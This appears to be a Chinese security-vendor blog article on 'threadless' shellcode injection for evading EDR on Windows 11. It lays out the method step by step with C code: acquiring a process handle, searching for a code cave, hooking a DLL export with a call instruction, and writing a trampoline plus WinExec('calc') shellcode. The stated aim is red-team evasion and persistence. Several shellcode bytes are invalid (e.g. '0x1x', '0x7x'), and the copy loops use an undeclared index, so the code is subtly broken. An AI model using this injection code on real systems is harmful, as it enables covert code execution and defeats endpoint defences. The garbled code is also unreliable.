> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzUzMDUxNTE1Mw==&mid=2247512531&idx=1&sn=caa1995edafc7abc51b2542b28484b2d

#  无线程Shellcode注入：突破EDR检测的隐匿技术  
原创 ixin  山石网科安全技术研究院   2025-07-21 10:15  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/NGIAw2Z6vnLzibrp7C4HmazCNIQXMJIRxvbibNMMmxDGrTN0Z9ibYzXnSNKobTzADCPgdo1b7ukKNARFEicHqQiajWw/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8Jb8ZACqDjPdMzgicp2SzdZ19mFnVcBO53s1uA2cSfarQkwibVUeCeH9w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
****  
****  
**如何在不触发EDR告警的情况下，将恶意代码注入目标进程？无线程Shellcode注入技术给出了答案。**  
  
****  
****  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/NGIAw2Z6vnLKuKAwMiaYedpTAYugKibaTBsHzf5pDuztECgfIgOfpG5DRF31jzhosMEj23dlx186q0zgLaIZj9lA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
在网络安全的攻防博弈中，随着传统进程注入技术逐渐被EDR（终端检测与响应）工具所拦截，攻击者必须寻找新的方法来实现无痕入侵。本文将深入探讨一  
种名为无线程Shellcode注入的技术[1]，这种技术能够在完全防护的Windows 11 23H2 x64系统中，无需创建新线程即可完成第三方进程注入，从而绕过EDR的检测。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**一、传统Shellcode注入技术的检测特征分析**  
  
****  
  
标准进程注入操作构成完整IoC链，各环节均受EDR内核监控：  
  
  
1.进程访问阶段  
- 用户态API：  
OpenProcess(PROCESS_ALL_ACCESS)  
  
- 内核态系统调用：  
NtOpenProcess  
的  
DesiredAccess  
参数检测  
  
- EDR Hook点：  
ObRegisterCallbacks  
进程句柄过滤  
  
2.内存操作阶段  
- 显式分配：  
VirtualAllocEx(MEM_COMMIT|MEM_RESERVE)  
  
- 内存映射：  
NtMapViewOfSection  
的SEC_IMAGE属性欺骗检测  
  
- ETW事件：  
Microsoft-Windows-Threat-Intelligence  
的 MemoryAllocation事件  
  
3.代码写入阶段  
- 直接写入：  
WriteProcessMemory  
触发的CR3切换监控  
  
- 间接写入：基于  
NtWriteVirtualMemory  
的Copy-on-Write检测  
  
4.执行触发阶段  
- 线程创建：  
CreateRemoteThread  
的线程起始地址白名单校验  
  
- APC注入：  
NtQueueApcThread  
的KAPC_STATE结构体分析  
  
- 内核回调：  
PsSetCreateThreadNotifyRoutine  
  
该操作序列已被EDR深度固化检测，一旦触发，立即判定为恶意行为并终止进程。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**二、核心问题**  
  
****  
  
能否在不直接调用敏感WinAPI的情况下实现相同功能？前三个步骤（进程访问、内存操作、代码写入）存在替代方案，但在执行阶段中如果存在（  
CreateRemoteThread  
/  
NtQueueApcThread  
）必然触发EDR告警。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**三、核心技术方案：动态库函数劫持构建隐蔽通信通道**  
  
****  
  
技术目标  
：通过合法进程网络函数实现无文件化隐蔽通信。  
  
  
**（一）目标函数筛选**  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8WFHRW8Evk0zcqAPJSmSRktqm69UXCNGtz8L1sz1g1Wg3sEYViamG90Q/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
- 协议层：  
  
- 传输层：  
socket()  
（连接创建）、  
sendto()  
（UDP数据）。  
  
- 应用层：  
WinHttpSendRequest()  
（HTTP请求）、业务函数（如  
UpdateCheck()  
）。  
  
- 关键条件：低频稳定调用（  
如  
分钟  
级  
心跳检测）、参数可安全修改（如URL重定向）。  
  
**（二）函数劫持实现**  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8WFHRW8Evk0zcqAPJSmSRktqm69UXCNGtz8L1sz1g1Wg3sEYViamG90Q/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
- 内联钩子（Inline Hook）：  
  
- 补丁函数入口前5字节为  
jmp  
指令，指向内存中Shellcode。  
  
- Trampoline跳板保存原指令，确保注入后恢复原函数执行流程。  
  
**（三）隐蔽通信机制**  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8WFHRW8Evk0zcqAPJSmSRktqm69UXCNGtz8L1sz1g1Wg3sEYViamG90Q/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
- 协议伪装  
：攻击数据嵌入HTTP头、DNS查询等合法流量。  
  
- 规避检测  
：  
  
- 用户态DLL优先（如  
ws2_32.dll  
），避免内核态风险。  
  
- 反射式注入（无磁盘文件）+动态Hook地址变更，绕过EDR扫描。  
  
技术链路  
：逆向定位函数→Hook注入代码→利用原生通道传输数据→模拟合法流量特征。  
  
  
该技术的实现包含以下步骤：  
  
1.  
定位可执行内存段  
：在目标进程地址空间中搜索满足Shellcode及跳板指令部署要求的连续内存区域  
  
2.  
写入代码  
：将shellcode和trampoline入该内存区域；  
  
3.  
补丁修改导出函数  
：修改动态链接库（DLL）的导出函数，使其执行我们的代码；  
  
4.  
等待函数调用触发执行  
：等待目标函数被调用，从而触发shellcode运行。  
  
  
但动态库可能包含成千上万个函数，随机选择的函数可能并不适用谁都不能保证它会在合理时间内被调用。  
  
  
解决思路  
：需要深入分析目标软件，从中筛选出可拦截的导出函数。理想情况下，应选择定期调用特定DLL函数的应用程序（例如：磁盘临时访问文件并写入中间结果时，或按固定间隔调用相关API检查服务器可用性时）。若找到此类函数，就能确保在确定的调用周期内触发。  
  
  
注意事  
项  
：高频函数劫持警告：避免拦截调用频率＞1Hz的函数，易引发进程崩溃或性能异常。  
  
  
研究工具推荐  
：可使用API Monitor.进行分析。该工具能够实时显示WinAPI的调用情况，以及测试程序中哪些操作会触发这些调用。此外，还能查看附加到进程的DLL及其实现的API（而非仅显示来源不明的WinAPI列表）。基于监控数据可判断动态库导出函数中哪些适合拦截，并作为目标函数。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSP0ocM9G62txBic1iaBjGHeZ1CFB9kEPtuVGnMmzgpOibzgmxa6sYpsu05TdotKYNibwkUsozZfg2crQ/640?wx_fmt=png&from=appmsg "")  
  
  
API Monitor  
：一旦完成对目标测试程序的逆向分析并精准定位所需的WinAPI接口，即可进入编码实现阶段。  
  
****  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**四、编程实现**  
  
****  
  
让我们通过代码实现无线程注入（Threadless Injection）所需的每个步骤。  
  
**（一）通过进程名称获取目标进程句柄**  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8WFHRW8Evk0zcqAPJSmSRktqm69UXCNGtz8L1sz1g1Wg3sEYViamG90Q/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  

```
HANDLE hProc = NULL;                  
LPCWSTR ps_name;                      
DWORD *procID;                        
PROCESSENTRY32 pe32;                  
pe32.dwSize = sizeof(PROCESSENTRY32); 

// 创建进程快照
HANDLE process_snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (!process_snap) return NULL;       

// 遍历进程列表
if (Process32First(process_snap, &pe32)) {
    do {
        if (_wcsicmp(pe32.szExeFile, ps_name) == 0) {
            *procID = pe32.th32ProcessID;  
            
            // 打开进程（请求全部权限）
            hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *procID);
            if (!hProc) continue;          
            return hProc;                  
        }
    } while (Process32Next(process_snap, &pe32)); 
}

```

  
  
****  
**（二）加载目标动态库并获取API地址**  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8WFHRW8Evk0zcqAPJSmSRktqm69UXCNGtz8L1sz1g1Wg3sEYViamG90Q/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
接下来，你需要加载目标动态库（其导出函数包含你需要的API），并获取该 API函数的地址。例如，如果你想拦截网络通信，可以加载  
kernelbase.dll  
。  
  

```
// 尝试获取kernelbase.dll的模块句柄（宽字符版本，适用于Unicode环境）
HMODULE hModule = GetModuleHandleW(L&#34;kernelbase.dll&#34;); 
// 若模块未加载（句柄为NULL），则显式加载该DLL到当前进程地址空间
if (hModule == NULL) 
    hModule = LoadLibraryW(L&#34;kernelbase.dll&#34;);
```

  
  
需要获取目标DLL中API函数的内存地址  
  

```
// 获取已加载的kernelbase.dll模块句柄
HMODULE hModule = GetModuleHandleW(L&#34;kernelbase.dll&#34;); 
if (hModule == NULL) 
    hModule = LoadLibraryW(L&#34;kernelbase.dll&#34;); 
```

  
  
内存空间探测（定位可执行代码注入区）  
  

```
// 存储找到的可用内存地址
UINT_PTR  addr_of_codecave;    
uint64_t function_addr;        
BOOL gotchaCave;               

// 以目标函数为中心，向两侧扩展搜索（±1.8GB范围）
for (addr_of_codecave = (function_addr & 0xFFFFFFFFFFF70000) - 0x70000000;
     addr_of_codecave < function_addr + 0x70000000;
     addr_of_codecave += 0x10000)  
{
    LPVOID lpAddr = VirtualAllocEx(hProc,
                                   addr_of_codecave,
                                   size,
                                   MEM_COMMIT | MEM_RESERVE,  
                                   PAGE_EXECUTE_READWRITE);   
    
    if (lpAddr == NULL) continue;
    
    // 成功分配内存，记录地址并终止搜索
    gotchaCave = TRUE;
    break;
}

// 返回找到的可用内存地址（失败返回NULL）
if (gotchaCave == TRUE) return addr_of_codecave;
```

  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**五、Trampoline与Payload的处理**  
  
****  
  
为清晰起见，我们将Trampoline和Payload分开定义。我们使用Payload调出计算器进行测试，Trampoline负责平衡堆栈、保存/恢复寄存器，并在调用Payload后恢复原函数执行流程。  
  

```
unsigned char tramp_to_shellcode[] = {
    // 执行流劫持准备
    0x58,0x48, 0x83, 0xE8, 0x05, 
    
    // 寄存器保存区
    0x50,0x51,0x52,   
    0x41,0x50,0x41,0x51,0x41,0x52,0x41,0x53, 

    // Shellcode加载段
    0x48, 0xB9,0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 
    0x48, 0x89, 0x08, 
    
    // 执行环境配置
    0x48, 0x83, 0xEC, 0x40, 
    0xE8, 0x11, 0x00, 0x00, 0x00, 
    
    // 执行流恢复
    0x48, 0x83, 0xC4, 0x40,
    0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 
    0x5A, 0x59, 0x58, 
    0xFF, 0xE0, 
    0x90
};
unsignedchar shellcode[] = {
        // 保存寄存器状态 (RBX, RSI, RDI, RBP, RSP, RAX)
        0x53, 0x56, 0x57, 0x55, 0x54, 0x58,

        // 栈对齐调整 (16字节边界)
        0x66, 0x83, 0xE4, 0xF0, 

        // 准备调用参数 (&#34;calc&#34;)
        0x50, 0x6A, 0x60, 0x5A, 
        0x68, 0x63, 0x61, 0x6C, 0x63, 

        // PEB/TEB遍历开始
        0x54, 0x59, 0x48, 0x29, 0xD4,
        0x65, 0x48, 0x8B, 0x32,       
        0x48, 0x8B, 0x76, 0x18,      
        0x48, 0x8B, 0x76, 0x10,      

        // 导出表解析循环
        0x48, 0xAD,                  
        0x48, 0x8B, 0x30,            
        0x48, 0x8B, 0x7E, 0x30,      
        0x03, 0x57, 0x3C,           

        // 函数哈希比对
        0x8B, 0x5C, 0x17, 0x28,      
        0x8B, 0x74, 0x1x, 0x20,       
        0x48, 0x01, 0xFE, 
        0x8B, 0x54, 0x1F, 0x24,       
        0x0F, 0xB7, 0x2C, 0x1x,      

        // WinExec调用准备
        0x8D, 0x52, 0x02, 
        0xAD, 
        0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45,  
        0x7x, 0xEF,                 
        // 调用执行
        0x8B, 0x74, 0x1F, 0x1C,      
        0x48, 0x01, 0xFE, 
        0x8B, 0x34, 0xAE,             
        0x4x, 0x01, 0xF7,             
        0x99, 0xFF, 0xD7,            

        // 恢复现场
        0x48, 0x83, 0xC4, 0x68,       
        0x5C, 0x5D, 0x5x, 0x5E, 0x5B, 
        0xC3                          
};
```

  
  
读取DLL导出函数的起始部分并利用获取的数据配置Trampoline  
  

```
int64_t originalBytes = *(int64_t*)dll_export_fun_addr; 
// 将原函数前8字节指令写入跳板代码偏移0x12处（预留空间需为全零）
*(uint64_t*)(tramp_to_shellcode + 0x12) = originalBytes;
```

  
  
配置内存并授予PAGE_EXECUTE_READWRITE权限以设置Hook：  
  

```
DWORD saveProtectFlags = 0;
// 修改目标函数所在内存页的保护属性为可执行+读写（8字节范围）
if (!VirtualProtectEx(hProc, dll_export_fun_addr, 8, PAGE_EXECUTE_READWRITE, &saveProtectFlags)) 
    return 1; 
```

  
  
在被攻击库导出的函数中创建hook并调用然后对其进行配置：  
  

```
// Call function opcode（函数调用操作码）
unsigned char call_opcode_to_shell[] = { 0xe8, 0, 0, 0, 0 };
// 计算相对调用地址（目标地址 - 当前指令地址 - 指令长度）
int call_addr = (remoteAddress - ((UINT_PTR)dll_export_fun_addr + 5));
// 配置call指令的操作数（相对偏移量）
*(int*)(call_opcode_to_shell + 1) = call_addr;
```

  
  
写入Trampoline和Payload，然后更改目标内存属性：  
  
首先设置为  
PAGE_EXECUTE_READWRITE  
（可执行、读、写）完成后把  
PAGE_EXECUTE_READ  
恢复为（可执行、读）。  
  

```
VirtualProtectEx(hProc,
            call_opcode_to_shell,
            sizeof(call_opcode_to_shell),
            PAGE_EXECUTE_READWRITE,
            NULL);
    if (!WriteProcessMemory(hProc,
            dll_export_fun_addr,
            call_opcode_to_shell,
            sizeof(call_opcode_to_shell),
            &numOfWrittenBytes))
    return 1;
    unsignedchar mypayload[sizeof(tramp_to_shellcode) + sizeof(shellcode)];
// 在这两个循环中，创建一个同时包含shellcode和Trampoline的大payload
    for (size_t x = 0; x < sizeof(tramp_to_shellcode); ++x)
        mypayload[i] = tramp_to_shellcode[i];
    for (size_t x = 0; x < sizeof(shellcode); ++x)
        mypayload[sizeof(shellcode) + i] = shellcode[i];
// 修改内存访问标志以启用写入权限
    if (!VirtualProtectEx(hProc,
            remoteAddress,
            sizeof(mypayload),
            PAGE_READWRITE,
            &saveProtectFlags))
    return 1;
// 写入payload
    if (!WriteProcessMemory(hProc,
            remoteAddress,
            mypayload,
            sizeof(mypayload),
            &numOfWrittenBytes))
    return 1;
// 恢复内存访问权限
    if (!VirtualProtectEx(hProc,
            remoteAddress,
            sizeof(mypayload),
            PAGE_EXECUTE_READ,
            &saveProtectFlags))
    return 1;
```

  
  
当前阶段的主要任务为等待应用程序触发对已修补函数的调用。经分析，被修改的API已通过API Monitor验证存在周期性触发逻辑，因此预计在较短时间内可观察到预期执行效果。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**六、结论**  
  
****  
  
以上便是无线程注入技术的核心原理解析——该技术无需显式调用线程创建函数即可完成代码注入。实现突破了传统注入方法的固有范式，为规避安全检测并维持持久化操作提供了新路径。  
  
  
需要明确的是，上述代码仅为概念验证模板，若要实现真正意义上的隐蔽性，仍需在内存管理、代码混淆、通信机制等维度进行深度优化。无线程注入技术无法作为单一的全场景解决方案，无法单凭自身实现完全的攻击隐蔽性。从红队作战的专业视角出发，唯有将注入技术与API调用欺骗、代码虚拟化、流量加密等多重技术手段进行体系化组合，才能构建具备实战威慑力的攻击链条。  
  
  
网络安全对抗本质上是技术纵深与攻防智慧的博弈，愿以上内容为您在复杂的攻击场景中提供有效参考。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**七、相关链接**  
  
  
[1]https://hackmag.com/security/threadless-injection  
  
[2]https://hackmag.com/security/pentest-howto  
  
[3]https://hackmag.com/security/ethernet-abyss  
  
[4]https://hackmag.com/security/gateway-bleeding  
  
[5]https://hackmag.com/security/aguard-cve  
  
[6]https://hackmag.com/security/routing-nightmare  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8KrXv9sZf93yt4huq2kARyZSgmdnic40GayohIYiaD2FAkkAqJehJSMtQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
山石网科是中国网络安全行业的技术创新领导厂商，由一批知名网络安全技术骨干于2007年创立，并以首批网络安全企业的身份，于2019年9月登陆科创板（股票简称：山石网科，股票代码：688030）。  
  
现阶段，山石网科掌握30项自主研发核心技术，申请560多项国内外专利。山石网科于2019年起，积极布局信创领域，致力于推动国内信息技术创新，并于2021年正式启动安全芯片战略。2023年进行自研ASIC安全芯片的技术研发，旨在通过自主创新，为用户提供更高效、更安全的网络安全保障。目前，山石网科已形成了具备“全息、量化、智能、协同”四大技术特点的涉及  
基础设施安全、云安全、数据安全、应用安全、安全运营、工业互联网安全、信息技术应用创新、安全服务、安全教育等九大类产品服务，50余个行业和场景的完整解决方案。  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/NGIAw2Z6vnLzibrp7C4HmazCNIQXMJIRxPibycdiaNQCI4PNojUk3eYCQDZs6c5zNMUkq7yFNeYQIxicAV33eHNdFA/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
